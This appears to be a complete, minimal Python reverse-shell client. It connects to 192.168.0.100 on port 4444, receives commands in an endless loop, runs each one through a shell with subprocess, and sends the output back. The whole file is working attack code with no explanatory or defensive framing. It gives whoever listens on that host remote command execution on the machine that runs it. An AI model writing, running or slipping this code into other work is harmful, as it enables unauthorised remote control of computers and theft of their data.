#!/usr/bin/env python

import socket
import subprocess

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.0.100", 4444))

while True:
    print("ON")
    command = connection.recv(1024)
    command_result = subprocess.check_output(command, shell=True)
    connection.send(command_result)
